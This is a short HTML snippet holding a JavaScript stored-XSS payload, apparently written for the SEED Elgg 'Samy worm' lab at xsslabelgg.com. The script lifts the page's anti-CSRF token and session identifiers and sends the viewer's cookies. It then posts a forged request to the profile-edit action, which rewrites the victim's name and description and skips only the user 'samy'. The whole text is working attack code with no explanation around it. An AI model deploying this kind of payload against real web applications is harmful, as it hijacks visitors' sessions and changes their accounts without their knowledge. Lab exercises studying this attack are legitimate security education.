<p>&nbsp;</p>
<script type="text/javascript">// <![CDATA[
var Ajax=null;

token=elgg.security.token.__elgg_token;
ts=elgg.security.token.__elgg_ts;
guid=elgg.page_owner['guid'];
userName=elgg.page_owner['username'];
sessionUser=elgg.session.user['username'];
userId=elgg.session.user['guid'];

url="http://www.xsslabelgg.com/action/profile/edit";

Ajax=new XMLHttpRequest();
Ajax.open("POST",url,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

desc="hey I completed task 5";
descE=escape(desc);
var content1="&name=boby&description="+descE+"&guid=40"; 
var content2="__elgg_token="+token.toString()+"&__elgg_ts="+ts.toString();
content=content2+content1;
if(userName.toString()=="samy"){
alert("Samy's worm");
}
else
{
Ajax.send(content);
}

// ]]></script>